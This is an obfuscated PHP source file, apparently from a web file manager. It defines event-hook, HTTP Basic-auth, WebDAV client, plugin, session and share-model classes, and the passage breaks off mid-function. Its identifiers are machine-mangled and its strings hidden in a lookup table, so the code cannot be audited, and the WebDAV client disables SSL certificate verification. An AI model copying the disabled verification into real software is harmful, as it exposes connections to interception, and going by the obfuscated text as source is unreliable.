<?php
 goto F’ŒŠÈÀ³•; d±°¯®‰‡ì: class Hook { private static $events = array(); public static function get($Cô¯øù¾­ï = false) { if (!$Cô¯øù¾­ï) { return self::$events; } else { return self::$events[$Cô¯øù¾­ï]; } } public static function apply($dç®Û¯—·„, $FáÕí³—·í = array()) { $Dâ×ÚÂ‘ø = ActionApply($dç®Û¯—·„, $FáÕí³—·í); if (is_string($dç®Û¯—·„)) { Hook::trigger($dç®Û¯—·„); } return $Dâ×ÚÂ‘ø; } public static function bind($b¯ÕŒŒšğ«, $e­Éä¤ßƒ, $Câô ôôÜ¿ = false) { $Cëîå—×«÷ =& $_SERVER[ºÖÙÂŒäÉê‡]; if (!isset(self::$events[$b¯ÕŒŒšğ«])) { self::$events[$b¯ÕŒŒšğ«] = array(); } self::$events[$b¯ÕŒŒšğ«][] = array($Cëîå—×«÷[1713] => $e­Éä¤ßƒ, $Cëîå—×«÷[1714] => $Câô ôôÜ¿, $Cëîå—×«÷[1715] => 0); } public static function once($Eœš§÷­§â, $Dƒåï’ß”…) { self::bind($Eœš§÷­§â, $Dƒåï’ß”…, !0); } public static function unbind($cæ¨‘Û’Êã, $D¬¢Şœñ¶ = false) { if (!$D¬¢Şœñ¶) { self::$events[$cæ¨‘Û’Êã] = array(); return; } $F¨™ù“Â = self::$events[$cæ¨‘Û’Êã]; self::$events[$cæ¨‘Û’Êã] = array(); if (!is_array($F¨™ù“Â)) { return; } for ($B¾äÃÍ¢«‰ = 0; $B¾äÃÍ¢«‰ < count($F¨™ù“Â); $B¾äÃÍ¢«‰++) { if ($F¨™ù“Â[$B¾äÃÍ¢«‰][$_SERVER[ºÖÙÂŒäÉê‡][1713]] == $D¬¢Şœñ¶) { continue; } self::$events[$cæ¨‘Û’Êã][] = $F¨™ù“Â[$B¾äÃÍ¢«‰]; } } public static function filter($eğĞôÓ¼Çè, $B––±¥ÑŠù) { goto A•Ê¥¶¯Û¥; c§µƒÁ¹: $eß¾ÈìèÔŒ = $d›§¢‡ô£°[$eğĞôÓ¼Çè]; $D¡±¾†ËÉ = $B––±¥ÑŠù; if (!is_array($eß¾ÈìèÔŒ) || count($eß¾ÈìèÔŒ) == 0) { return $D¡±¾†ËÉ; } goto dóÕğÔæ÷‡; dóÕğÔæ÷‡: for ($CºÙëÁíƒ = 0; $CºÙëÁíƒ < count($eß¾ÈìèÔŒ); $CºÙëÁíƒ++) { $cƒÉäîÍ‰ = $eß¾ÈìèÔŒ[$CºÙëÁíƒ]; if ($cƒÉäîÍ‰[$bæÎËª¦¸×[1714]] && $cƒÉäîÍ‰[$bæÎËª¦¸×[1715]] > 1) { continue; } self::$events[$eğĞôÓ¼Çè][$CºÙëÁíƒ][$bæÎËª¦¸×[1715]] = $cƒÉäîÍ‰[$bæÎËª¦¸×[1715]] + 1; $FÖÇÀ‰éä = self::apply($cƒÉäîÍ‰[$bæÎËª¦¸×[1713]], array($D¡±¾†ËÉ)); if (gettype($FÖÇÀ‰éä) == gettype($D¡±¾†ËÉ)) { $D¡±¾†ËÉ = $FÖÇÀ‰éä; } } return $D¡±¾†ËÉ; goto A·÷Ô½¿éÏ; A•Ê¥¶¯Û¥: $bæÎËª¦¸× =& $_SERVER[ºÖÙÂŒäÉê‡]; $d›§¢‡ô£° = self::$events; if (!isset($d›§¢‡ô£°[$eğĞôÓ¼Çè])) { return $B––±¥ÑŠù; } goto c§µƒÁ¹; A·÷Ô½¿éÏ: } public static function trigger($DÚÙ¶±Òæ£) { goto a¿ëİ±”–™; bÈï„—çŠ¿: $BïÒŞ´Œõ¢ = func_get_args(); array_shift($BïÒŞ´Œõ¢); for ($dã®Ğ½ÍœÆ = 0; $dã®Ğ½ÍœÆ < count($B—•ŞºÖèå); $dã®Ğ½ÍœÆ++) { $aÕò­ë„Î = $B—•ŞºÖèå[$dã®Ğ½ÍœÆ]; if ($aÕò­ë„Î[$AÂ«‚ğ¡«‰[1714]] && $aÕò­ë„Î[$AÂ«‚ğ¡«‰[1715]] > 1) { continue; } if (defined($AÂ«‚ğ¡«‰[1716]) && GLOBAL_LOG_HOOK) { write_log($DÚÙ¶±Òæ£ . $AÂ«‚ğ¡«‰[1717] . $aÕò­ë„Î[$AÂ«‚ğ¡«‰[1713]], $AÂ«‚ğ¡«‰[1718]); } self::$events[$DÚÙ¶±Òæ£][$dã®Ğ½ÍœÆ][$AÂ«‚ğ¡«‰[1715]] = $aÕò­ë„Î[$AÂ«‚ğ¡«‰[1715]] + 1; $Dö«„ëëÙ = self::apply($aÕò­ë„Î[$AÂ«‚ğ¡«‰[1713]], $BïÒŞ´Œõ¢); if (defined($AÂ«‚ğ¡«‰[1716]) && GLOBAL_LOG_HOOK) { write_log(get_caller_info(), $AÂ«‚ğ¡«‰[1718]); if ($aÕò­ë„Î[$AÂ«‚ğ¡«‰[1715]] == 200) { $eíæËÂæ = is_array($aÕò­ë„Î[$AÂ«‚ğ¡«‰[1713]]) ? json_encode_force($aÕò­ë„Î[$AÂ«‚ğ¡«‰[1713]]) : $aÕò­ë„Î[$AÂ«‚ğ¡«‰[1713]]; write_log($AÂ«‚ğ¡«‰[1719] . $DÚÙ¶±Òæ£ . $AÂ«‚ğ¡«‰[1720] . $eíæËÂæ, $AÂ«‚ğ¡«‰[1721]); } } $eÚ¦‹’Ò‰˜ = is_null($Dö«„ëëÙ) ? $eÚ¦‹’Ò‰˜ : $Dö«„ëëÙ; } goto aÏ‹ÖÇ®; aÏ‹ÖÇ®: return $eÚ¦‹’Ò‰˜; goto e’İíŞ ¯è; a¿ëİ±”–™: $AÂ«‚ğ¡«‰ =& $_SERVER[ºÖÙÂŒäÉê‡]; $cåé¯÷‘›Š = self::$events; $eÚ¦‹’Ò‰˜ = !1; goto bğ¥ßõˆÅÁ; bğ¥ßõˆÅÁ: if (!isset($cåé¯÷‘›Š[$DÚÙ¶±Òæ£])) { return $eÚ¦‹’Ò‰˜; } $B—•ŞºÖèå = $cåé¯÷‘›Š[$DÚÙ¶±Òæ£]; if (!is_array($B—•ŞºÖèå) || count($B—•ŞºÖèå) == 0) { return $eÚ¦‹’Ò‰˜; } goto bÈï„—çŠ¿; e’İíŞ ¯è: } } class HttpAuth { public static function get() { $b‡øäªŒÔ— =& $_SERVER[ºÖÙÂŒäÉê‡]; $f…ìåğÊöÃ = $b‡øäªŒÔ—[33]; $F˜Ì™¹‘…Ñ = $b‡øäªŒÔ—[33]; if (isset($_SERVER[$b‡øäªŒÔ—[1722]])) { $f…ìåğÊöÃ = $_SERVER[$b‡øäªŒÔ—[1722]]; $F˜Ì™¹‘…Ñ = $_SERVER[$b‡øäªŒÔ—[1723]]; } elseif (isset($_SERVER[$b‡øäªŒÔ—[1724]])) { $aÙ¸İ‡˜¿¤ = $_SERVER[$b‡øäªŒÔ—[1724]]; if (strpos(strtolower($aÙ¸İ‡˜¿¤), $b‡øäªŒÔ—[1725]) === 0) { $b‰¡×‚¢ = explode($b‡øäªŒÔ—[4], base64_decode(substr($aÙ¸İ‡˜¿¤, 6))); $f…ìåğÊöÃ = isset($b‰¡×‚¢[0]) ? $b‰¡×‚¢[0] : $b‡øäªŒÔ—[33]; $F˜Ì™¹‘…Ñ = isset($b‰¡×‚¢[1]) ? $b‰¡×‚¢[1] : 0; } } return array($b‡øäªŒÔ—[539] => $f…ìåğÊöÃ, $b‡øäªŒÔ—[889] => $F˜Ì™¹‘…Ñ); } public static function error() { goto C¯Ë¼•ê; C¯Ë¼•ê: $DéÕÛº¶‹ =& $_SERVER[ºÖÙÂŒäÉê‡]; header($DéÕÛº¶‹[1726]); header($DéÕÛº¶‹[1727]); goto E¥ ™…ŒŸÌ; E¥ ™…ŒŸÌ: header($DéÕÛº¶‹[1728]); header($DéÕÛº¶‹[1729]); header($DéÕÛº¶‹[1245]); goto C¹™Ñéã‘ˆ; C¹™Ñéã‘ˆ: die; goto DÎÃí…ÚˆÍ; DÎÃí…ÚˆÍ: } public static function make($Bß­ÄöíÇ, $E·ì¢‚½Œ) { $CœÏˆ†§‚ =& $_SERVER[ºÖÙÂŒäÉê‡]; return $CœÏˆ†§‚[1730] + base64_encode($Bß­ÄöíÇ . $CœÏˆ†§‚[4] . $E·ì¢‚½Œ); } } class HttpDavClient { public function __construct($bˆ‰½Ğ™ˆ, $Aˆ©¤Œ§ç–, $e²ÌÍ”Æ‰¶) { $this->header = array(); $this->userName = $Aˆ©¤Œ§ç–; $this->userPassowrd = $e²ÌÍ”Æ‰¶; } protected function makePath($b²ˆ¤Ğä¨) { return $b²ˆ¤Ğä¨; } protected function setHeader($aØÔğ‚õà–, $d©Èä¶ÅÌ¤ = false) { if ($d©Èä¶ÅÌ¤ === !1) { $this->header[] = $aØÔğ‚õà–; } else { $this->header[] = $aØÔğ‚õà– . $_SERVER[ºÖÙÂŒäÉê‡][872] . $d©Èä¶ÅÌ¤; } } public function move($cÏ¥Êæôå„, $AĞ´¹ˆ£–ï, $B– ä–„¢± = '') { $Bµù‰ˆâß =& $_SERVER[ºÖÙÂŒäÉê‡]; $this->setHeader($Bµù‰ˆâß[1731], $this->makePath($AĞ´¹ˆ£–ï)); $this->setHeader($Bµù‰ˆâß[1732], $Bµù‰ˆâß[1733]); if ($B– ä–„¢±) { $this->setHeader($Bµù‰ˆâß[1734], $Bµù‰ˆâß[917] . $B– ä–„¢± . $Bµù‰ˆâß[920]); } return $this->send($Bµù‰ˆâß[1735], $cÏ¥Êæôå„); } public function copy($e«¨Š‚ğˆº, $CŸÙÓ¾ØĞ•) { $F‰¯¿¯Êæ® =& $_SERVER[ºÖÙÂŒäÉê‡]; $this->setHeader($F‰¯¿¯Êæ®[1731], $this->makePath($CŸÙÓ¾ØĞ•)); $this->setHeader($F‰¯¿¯Êæ®[1732], $F‰¯¿¯Êæ®[1733]); return $this->send($F‰¯¿¯Êæ®[1736], $e«¨Š‚ğˆº); } public function mkcol($cĞ‰ğíÎÕ) { $f”µÍ¨ãÁ =& $_SERVER[ºÖÙÂŒäÉê‡]; $this->setHeader($f”µÍ¨ãÁ[1732], $f”µÍ¨ãÁ[1733]); return $this->send($f”µÍ¨ãÁ[1737], $cĞ‰ğíÎÕ); } public function delete($CÇÉ¡Ùå¯ï, $A¥è“åç² = '') { $E•Ê™éø› =& $_SERVER[ºÖÙÂŒäÉê‡]; if ($A¥è“åç²) { $this->setHeader($E•Ê™éø›[1734], $E•Ê™éø›[917] . $A¥è“åç² . $E•Ê™éø›[920]); } return $this->send($E•Ê™éø›[1233], $CÇÉ¡Ùå¯ï); } public function propfind($c‚‘óóß±) { $D£Šª‹ù¿ =& $_SERVER[ºÖÙÂŒäÉê‡]; $this->setHeader($D£Šª‹ù¿[1738], $D£Šª‹ù¿[83]); $this->setHeader($D£Šª‹ù¿[1739], $D£Šª‹ù¿[1740]); $cñå¢œÊîÑ = $D£Šª‹ù¿[1741]; return $this->send($D£Šª‹ù¿[1742], $c‚‘óóß±, $cñå¢œÊîÑ); } public function options($C¼îù‡¿ã) { return $this->send($_SERVER[ºÖÙÂŒäÉê‡][1743], $C¼îù‡¿ã); } public function get($eí•ØÕã‘‚) { return $this->send($_SERVER[ºÖÙÂŒäÉê‡][222], $eí•ØÕã‘‚); } public function put($A†–ÅÇ…ñí, $aôöÑ¿´ÉÇ, $bà‚ö³²õ = '') { $d¨Á»âáŸé =& $_SERVER[ºÖÙÂŒäÉê‡]; if ($bà‚ö³²õ) { $this->setHeader($d¨Á»âáŸé[1734], $d¨Á»âáŸé[917] . $bà‚ö³²õ . $d¨Á»âáŸé[920]); } return $this->send($d¨Á»âáŸé[220], $A†–ÅÇ…ñí, $aôöÑ¿´ÉÇ); } protected function send($A³Àùá«˜Ü, $E®ÄÑó×, $bÃã¬›»³ = false, $CŸöª¼íâ = false) { goto E´Š£  ç¸; e•©êºÄ: $this->setHeader($b¶†µ¼õ); if ($bÃã¬›»³) { $bÃã¬›»³ = $dÏÑëó’’¢[1745] . $bÃã¬›»³; } if (!request_url_safe($E®ÄÑó×)) { return !1; } goto aˆµÛ´•š; f¡Â´œ®¶Ä: curl_setopt($aè‚ù°×á², CURLOPT_HTTPHEADER, $this->header); curl_setopt($aè‚ù°×á², CURLOPT_RETURNTRANSFER, !0); curl_setopt($aè‚ù°×á², CURLOPT_PROTOCOLS, CURLPROTO_HTTP | CURLPROTO_HTTPS); goto DÔô¡°÷·Ó; DÔô¡°÷·Ó: curl_setopt($aè‚ù°×á², CURLOPT_SSL_VERIFYPEER, !1); curl_setopt($aè‚ù°×á², CURLOPT_SSL_VERIFYHOST, !1); $CÇ¾Ü…é÷Ú = curl_exec($aè‚ù°×á²); goto bœÂĞÃ³Ô§; E´Š£  ç¸: $dÏÑëó’’¢ =& $_SERVER[ºÖÙÂŒäÉê‡]; $b¶†µ¼õ = HttpAuth::make($this->userName, $this->userPassowrd); $this->setHeader($dÏÑëó’’¢[1744], $dÏÑëó’’¢[50]); goto e•©êºÄ; aˆµÛ´•š: $aè‚ù°×á² = curl_init($E®ÄÑó×); curl_setopt($aè‚ù°×á², CURLOPT_CUSTOMREQUEST, $A³Àùá«˜Ü); curl_setopt($aè‚ù°×á², CURLOPT_HTTPAUTH, CURLAUTH_ANY); goto f¡Â´œ®¶Ä; bœÂĞÃ³Ô§: $this->header = array(); return $CÇ¾Ü…é÷Ú; goto d„˜¥Ñ¨Í; d„˜¥Ñ¨Í: } } goto e×˜¸Æñ¥‡; dÁæ·õ³æ¿: class PluginModel extends ModelBaseLight { public $optionType = "\x53\171\x73\164\x65\155\x2e\160\154\x75\147\x69\x6e\x4c\151\x73\x74"; public $field = array("\x6e\141\x6d\145", "\x73\164\141\x74\165\163", "\162\x65\x67\151\x65\163\x74", "\x63\157\156\x66\x69\x67"); public function loadList($eŞé¬‹ï‚ = false) { $A»†‘ëè–º = array_to_keyvalue($this->listData(), $_SERVER[ºÖÙÂŒäÉê‡][28]); if ($eŞé¬‹ï‚) { return $A»†‘ëè–º[$eŞé¬‹ï‚]; } return $A»†‘ëè–º; } public function init() { $B±Õœğà =& $_SERVER[ºÖÙÂŒäÉê‡]; Hook::trigger($B±Õœğà[2154]); $Bó˜ìâ“ªâ = $this->loadPluginList(); foreach ($Bó˜ìâ“ªâ as $eù¡è¥­ˆ† => $C¢¿™Û‡¸) { $EôŒ‰ÛÆ¿ = $this->appAllow($eù¡è¥­ˆ†, $C¢¿™Û‡¸); if (!$EôŒ‰ÛÆ¿) { continue; } foreach ($C¢¿™Û‡¸[$B±Õœğà[2155]] as $aé‘Ó¥¢Ç… => $F°šè¨«ùœ) { Hook::bind($aé‘Ó¥¢Ç…, $F°šè¨«ùœ); } } Hook::trigger($B±Õœğà[2156]); Hook::trigger(ACTION); } public function appAllow($D›²½ğóö¡, $bÏŒ»ğàù, $E»Í¯Ìñõ = true) { $DåƒŠƒ„·˜ =& $_SERVER[ºÖÙÂŒäÉê‡]; $däñõ‹‰ô = PLUGIN_DIR . $D›²½ğóö¡ . $DåƒŠƒ„·˜[2157]; if (!is_array($bÏŒ»ğàù) || !is_array($bÏŒ»ğàù[$DåƒŠƒ„·˜[2155]]) || !is_file($däñõ‹‰ô) || $bÏŒ»ğàù[$DåƒŠƒ„·˜[686]] != 1) { return !1; } if ($E»Í¯Ìñõ && !Action($DåƒŠƒ„·˜[2158])->checkAuth($D›²½ğóö¡)) { return !1; } return !0; } public function unInstall($D·§ñ¶ˆÂ„) { $e¡»š™°†¼ =& $_SERVER[ºÖÙÂŒäÉê‡]; $fÒ²ËÓ›¦ = $this->loadList($D·§ñ¶ˆÂ„); if (file_exists(PLUGIN_DIR . $D·§ñ¶ˆÂ„)) { Hook::apply($D·§ñ¶ˆÂ„ . $e¡»š™°†¼[2159]); } $this->remove($fÒ²ËÓ›¦[$e¡»š™°†¼[372]]); } public function changeStatus($f–ó‚½¶Ú, $f—‹°ÇÙºÎ) { $A£®ïÃ¢Øç =& $_SERVER[ºÖÙÂŒäÉê‡]; $Aé Ü¦ˆ²ä = $this->loadList($f–ó‚½¶Ú); if ($f—‹°ÇÙºÎ) { Hook::apply($f–ó‚½¶Ú . $A£®ïÃ¢Øç[2160]); } $this->update($Aé Ü¦ˆ²ä[$A£®ïÃ¢Øç[372]], array($A£®ïÃ¢Øç[2161] => $f—‹°ÇÙºÎ)); } public function appRegist($cÏƒ¨òˆºÖ, $c”“‚‘©³•) { $B‡¨­ñ‡ê =& $_SERVER[ºÖÙÂŒäÉê‡]; $fäËğçáÌ‹ = $this->loadList($cÏƒ¨òˆºÖ); if ($fäËğçáÌ‹) { $this->update($fäËğçáÌ‹[$B‡¨­ñ‡ê[372]], array($B‡¨­ñ‡ê[2155] => $c”“‚‘©³•)); } else { $c”’ø¸Œ¾Ü = array($B‡¨­ñ‡ê[28] => $cÏƒ¨òˆºÖ, $B‡¨­ñ‡ê[2155] => $c”“‚‘©³•, $B‡¨­ñ‡ê[686] => 0, $B‡¨­ñ‡ê[6] => $this->getConfigDefault($cÏƒ¨òˆºÖ)); $this->insert($c”’ø¸Œ¾Ü); } } public function getConfigDefault($DÜï˜È™) { $b´—åøîêÛ =& $_SERVER[ºÖÙÂŒäÉê‡]; $bÆ…Ş—·êª = array(); $EÓõŸä Ã = $this->getPackageJson($DÜï˜È™); if (!$EÓõŸä Ã && is_array($EÓõŸä Ã[$b´—åøîêÛ[2162]])) { return $bÆ…Ş—·êª; } foreach ($EÓõŸä Ã[$b´—åøîêÛ[2162]] as $c³Ö¶‹Õ‰« => $d¸„ÜîÜé‚) { if (!isset($d¸„ÜîÜé‚[$b´—åøîêÛ[364]]) || isset($bÆ…Ş—·êª[$c³Ö¶‹Õ‰«])) { continue; } $bÆ…Ş—·êª[$c³Ö¶‹Õ‰«] = $d¸„ÜîÜé‚[$b´—åøîêÛ[364]]; } return $bÆ…Ş—·êª; } public function getPackageJson($añô¼èÀçˆ) { return Hook::apply($añô¼èÀçˆ . $_SERVER[ºÖÙÂŒäÉê‡][2163]); } public function getConfig($c¢×Ş’»‰Û, $cÙÈ‡£Ä‹Ğ = false) { $Fåâé‰ìªĞ =& $_SERVER[ºÖÙÂŒäÉê‡]; $F¤Õñ§ó• = array(); $A ‹İÎæ”ë = $this->loadList($c¢×Ş’»‰Û); if ($A ‹İÎæ”ë && is_array($A ‹İÎæ”ë[$Fåâé‰ìªĞ[6]])) { $F¤Õñ§ó• = $A ‹İÎæ”ë[$Fåâé‰ìªĞ[6]]; } if (!$F¤Õñ§ó• || $cÙÈ‡£Ä‹Ğ) { $F¤Õñ§ó• = $this->getConfigDefault($c¢×Ş’»‰Û); } return $F¤Õñ§ó•; } public function setConfig($b”‘Šà¸µÍ, $fœÅ†ÑÜË‚ = false) { goto dÂŒ„§‹Í; dÂŒ„§‹Í: $B‘¸•“Î =& $_SERVER[ºÖÙÂŒäÉê‡]; $a¹ÃõˆŠÒ = $this->loadList($b”‘Šà¸µÍ); if (!$a¹ÃõˆŠÒ) { return !1; } goto CŞÚ¯Ú´íï; CŞÚ¯Ú´íï: if ($fœÅ†ÑÜË‚ == !1) { $fœÅ†ÑÜË‚ = $this->getConfigDefault($b”‘Šà¸µÍ); } $d‰Ç÷ëÈ = $a¹ÃõˆŠÒ[$B‘¸•“Î[6]]; foreach ($fœÅ†ÑÜË‚ as $aš×÷Ğ®ÍÂ => $AßâÊ–ğ©È) { $d‰Ç÷ëÈ[$aš×÷Ğ®ÍÂ] = is_string($AßâÊ–ğ©È) ? trim($AßâÊ–ğ©È) : $AßâÊ–ğ©È; } goto d åÇ’Ñó¼; d åÇ’Ñó¼: $this->update($a¹ÃõˆŠÒ[$B‘¸•“Î[372]], array($B‘¸•“Î[6] => $d‰Ç÷ëÈ)); goto dØ¦Á™ç……; dØ¦Á™ç……: } public function viewList() { goto F‰Å”—‹Î; f÷Ø‹ñ›¹: return $b·ëá‡Äù×; goto eªŸÆ Í‡; F‰Å”—‹Î: $a÷Ö ó©‡¤ =& $_SERVER[ºÖÙÂŒäÉê‡]; $aöõÈ‘¾í = $this->loadList(); $this->pluginScan($aöõÈ‘¾í); goto C­×Öğê…´; C­×Öğê…´: $aöõÈ‘¾í = $this->loadPluginList(); $b·ëá‡Äù× = array(); foreach ($aöõÈ‘¾í as $b×÷”¯­ õ => $d¦ä±Š³Áõ) { unset($d¦ä±Š³Áõ[$a÷Ö ó©‡¤[2155]], $d¦ä±Š³Áõ[$a÷Ö ó©‡¤[6]]); $F´ã™ñš½ = PLUGIN_DIR . $d¦ä±Š³Áõ[$a÷Ö ó©‡¤[28]] . $a÷Ö ó©‡¤[2157]; if (!is_file($F´ã™ñš½)) { continue; } $bçÍÀì»‡· = Hook::apply($d¦ä±Š³Áõ[$a÷Ö ó©‡¤[28]] . $a÷Ö ó©‡¤[2163]); if (is_array($bçÍÀì»‡·)) { $b·ëá‡Äù×[$b×÷”¯­ õ] = array_merge($d¦ä±Š³Áõ, $bçÍÀì»‡·); } } goto f÷Ø‹ñ›¹; eªŸÆ Í‡: } private function loadPluginList() { $DŸ‚¿åŒ¹ó =& $_SERVER[ºÖÙÂŒäÉê‡]; $fÅª‚ˆ¸‡å = $this->loadList(); if (strtolower(MOD) == $DŸ‚¿åŒ¹ó[2164]) { return $fÅª‚ˆ¸‡å; } $c¸¬ÛØ×Íõ = Hook::trigger($DŸ‚¿åŒ¹ó[2165], $fÅª‚ˆ¸‡å); if ($fÅª‚ˆ¸‡å && !$c¸¬ÛØ×Íõ) { die; } return $c¸¬ÛØ×Íõ ? $c¸¬ÛØ×Íõ : $fÅª‚ˆ¸‡å; } private function pluginScan($AÆÅ­Şƒã™) { $Eª”ŞØ¥Õ‹ =& $_SERVER[ºÖÙÂŒäÉê‡]; recursion_dir(PLUGIN_DIR, $dš‡‡á, $A”ÃåÜÚ, 0); foreach ($dš‡‡á as $AÄ°µŒ’Âº) { $a‘‘…Äøò× = get_path_this($AÄ°µŒ’Âº); if (isset($AÆÅ­Şƒã™[$a‘‘…Äøò×]) || !file_exists($AÄ°µŒ’Âº . $Eª”ŞØ¥Õ‹[2166]) || !file_exists($AÄ°µŒ’Âº . $Eª”ŞØ¥Õ‹[2157])) { continue; } Hook::apply($a‘‘…Äøò× . $Eª”ŞØ¥Õ‹[2160]); } } } class SessionModel extends ModelBase { protected $tableName = "\163\x79\163\x74\145\x6d\137\x73\145\163\x73\x69\157\156"; public function get($dŒİ½‡Ïé) { $b¦¿µ‘†… =& $_SERVER[ºÖÙÂŒäÉê‡]; $EâÓš™„„ = $this->where(array($b¦¿µ‘†…[2167] => $dŒİ½‡Ïé))->find(); if (!is_array($EâÓš™„„)) { return !1; } return $EâÓš™„„[$b¦¿µ‘†…[689]]; } public function set($bæ‹¶åõßì, $eØ–Œ†ºÁ, $a«è¯ë­å = 3600) { $a·ß±³æ«ê =& $_SERVER[ºÖÙÂŒäÉê‡]; $Fˆ¤‡é½ = array($a·ß±³æ«ê[2167] => $bæ‹¶åõßì, $a·ß±³æ«ê[2096] => $eØ–Œ†ºÁ, $a·ß±³æ«ê[2168] => $a«è¯ë­å + time()); if (Session::get($a·ß±³æ«ê[2169])) { $Fˆ¤‡é½[$a·ß±³æ«ê[1403]] = Session::get($a·ß±³æ«ê[2169]); } else { $Fˆ¤‡é½[$a·ß±³æ«ê[1403]] = 0; } if ($this->get($bæ‹¶åõßì)) { return $this->where(array($a·ß±³æ«ê[2167] => $bæ‹¶åõßì))->save($Fˆ¤‡é½); } else { return $this->add($Fˆ¤‡é½, array(), !0); } } public function remove($eÁŒêŞˆÒÛ) { return $this->where(array($_SERVER[ºÖÙÂŒäÉê‡][2167] => $eÁŒêŞˆÒÛ))->delete(); } public function clearTimeout() { return $this->where($_SERVER[ºÖÙÂŒäÉê‡][2170] . time())->delete(); } } class ShareModel extends ModelBase { protected $tableName = "\x73\x68\x61\162\145"; protected $dataAuto = array(array("\x6d\157\x64\151\146\171\124\x69\x6d\145", "\164\x69\155\145", "\x69\156\163\145\x72\x74\54\165\160\144\141\x74\x65", "\146\165\156\x63\164\151\157\x6e"), array("\143\162\x65\141\164\145\x54\151\155\x65", "\x74\151\155\145", "\x69\156\163\145\x72\x74", "\x66\x75\156\143\x74\151\157\x6e"), array("\x6f\160\164\x69\157\156\163", '', "\151\156\163\x65\162\164\54\x75\160\x64\141\164\x65\54\163\145\154\x65\143\164", "\x6a\x73\157\156")); private $fieldList = "\x2a"; protected function cacheFunctionAlias($d÷ÔÓÏÎïµ) { $dòĞ¾åˆÅÏ =& $_SERVER[ºÖÙÂŒäÉê‡]; $cÚ…¨©öŒ = isset($d÷ÔÓÏÎïµ[0]) ? $d÷ÔÓÏÎïµ[0] : !1; return array($dòĞ¾åˆÅÏ[2171] => array(USER_ID, $dòĞ¾åˆÅÏ[2172]), $dòĞ¾åˆÅÏ[2134] => array($cÚ…¨©öŒ, $dòĞ¾åˆÅÏ[2173])); } protected function listSimple() { $a†ÒŠÄí’È = array($_SERVER[ºÖÙÂŒäÉê‡][1403] => USER_ID); $aµñÎÁ·Ø„ = $this->field($this->fieldList)->where($a†ÒŠÄí’È)->select(); return $aµñÎÁ·Ø„ ? $aµñÎÁ·Ø„ : array(); } protected function getInfo($c”ƒ¡îÂá¢, $FƒÔ°Æğö† = false) { $aÃØ˜ÁœÊƒ =& $_SERVER[ºÖÙÂŒäÉê‡]; if ($FƒÔ°Æğö†) { return $this->_getShareInfo(array($aÃØ˜ÁœÊƒ[445] => $c”ƒ¡îÂá¢)); } $Eã‡»¾ÃŒÛ = $this->cacheFunctionGet($aÃØ˜ÁœÊƒ[2174], $c”ƒ¡îÂá¢); return $Eã‡»¾ÃŒÛ; } public function getInfoByHash($CµÈ“ˆ½µŸ) { return $this->_getShareInfo(array($_SERVER[ºÖÙÂŒäÉê‡][447] => $CµÈ“ˆ½µŸ)); } public function getInfoByPath($e ê–òÇŸø) { $a¸±“ñôŞ =& $_SERVER[ºÖÙÂŒäÉê‡]; $dŸâ¼ƒå®¦ = array($a¸±“ñôŞ[1403] => USER_ID, $a¸±“ñôŞ[374] => $e ê–òÇŸø); return $this->_getShareInfo($dŸâ¼ƒå®¦); } public function getInfoBySourcePath($EˆÉÚ¢™Ú) { $AÂù»›å£ =& $_SERVER[ºÖÙÂŒäÉê‡]; $eÌ½òŠ†‘• = array($AÂù»›å£[1403] => USER_ID, $AÂù»›å£[1008] => $EˆÉÚ¢™Ú); return $this->_getShareInfo($eÌ½òŠ†‘•); } private function _getShareInfo($c²ÄÉ•±°) { goto BŞğ¡ˆÖ; BŞğ¡ˆÖ: $d¶ÚõÀ× =& $_SERVER[ºÖÙÂŒäÉê‡]; $C¥†îÌ÷Ğ¦ = $this->where($c²ÄÉ•±°)->find(); if (!$C¥†îÌ÷Ğ¦) { return !1; } goto bŒÛ¸«­èï; F¥‹³æ—¦: if ($C¥†îÌ÷Ğ¦[$d¶ÚõÀ×[374]] == $d¶ÚõÀ×[472]) { $C¥†îÌ÷Ğ¦[$d¶ÚõÀ×[396]] = IO::info($C¥†îÌ÷Ğ¦[$d¶ÚõÀ×[1008]]); } else { $C¥†îÌ÷Ğ¦[$d¶ÚõÀ×[396]] = Model($d¶ÚõÀ×[1100])->pathInfo($C¥†îÌ÷Ğ¦[$d¶ÚõÀ×[374]]); } $C¥†îÌ÷Ğ¦[$d¶ÚõÀ×[2176]] = $d†ˆÚ›âì; return $C¥†îÌ÷Ğ¦; goto Eà¤¹Œ„Ç¢; bŒÛ¸«­èï: $c²ÄÉ•±° = array($d¶ÚõÀ×[445] => $C¥†îÌ÷Ğ¦[$d¶ÚõÀ×[445]]); $B²ÊËáÚ = $d¶ÚõÀ×[2175]; $d†ˆÚ›âì = Model($d¶ÚõÀ×[541])->order($d¶ÚõÀ×[372])->field($B²ÊËáÚ)->where($c²ÄÉ•±°)->select(); goto F¥‹³æ—¦; Eà¤¹Œ„Ç¢: } protected function getInfoAuth($aÛ³£¯Ù¨­) { $a¤©Æ„¨±Ê =& $_SERVER[ºÖÙÂŒäÉê‡]; $B½Ø¯½ŠÓ· = $this->getInfo($aÛ³£¯Ù¨­); $B½Ø¯½ŠÓ·[$a¤©Æ„¨±Ê[381]] = Model($a¤©Æ„¨±Ê[458])->authMake($B½Ø¯½ŠÓ·[$a¤©Æ„¨±Ê[2176]]); return $B½Ø¯½ŠÓ·; } protected function listData($bè»÷ğ”àÔ = null, $bØÓŠîØâÖ = 300) { $A¿¯¯®øåÁ =& $_SERVER[ºÖÙÂŒäÉê‡]; $EÑÜ“Á‹àÒ = array(array($A¿¯¯®øåÁ[450] => array($A¿¯¯®øåÁ[918], 0), $A¿¯¯®øåÁ[452] => array($A¿¯¯®øåÁ[918], 0), $A¿¯¯®øåÁ[2177] => $A¿¯¯®øåÁ[2146])); if ($bè»÷ğ”àÔ == $A¿¯¯®øåÁ[1833]) { $EÑÜ“Á‹àÒ = array($A¿¯¯®øåÁ[450] => 1); } else { if ($bè»÷ğ”àÔ == $A¿¯¯®øåÁ[997]) { $EÑÜ“Á‹àÒ = array($A¿¯¯®øåÁ[452] => 1); } } $EÑÜ“Á‹àÒ[$A¿¯¯®øåÁ[1403]] = USER_ID; $DÌñëè¼¬Ê = $this->where($EÑÜ“Á‹àÒ)->selectPage($bØÓŠîØâÖ); return $DÌñëè¼¬Ê; } protected function listToMe($a•“²­ÊÍ = 300) { goto AØÈîæ«Á; E¹÷µÎ‚± : $e¨¸ËĞ±¾œ = array($EªÖĞ“ó ¨[2180] => $d›¹ŠÂÑ–‡, $EªÖĞ“ó ¨[2181] => $EÚ–ö–ÃÕÆ[$EªÖĞ“ó ¨[356]]); return $e¨¸ËĞ±¾œ; goto a×‚Û´’³­; AØÈîæ«Á: $EªÖĞ“ó ¨ =& $_SERVER[ºÖÙÂŒäÉê‡]; $f¹öëİÊ» = 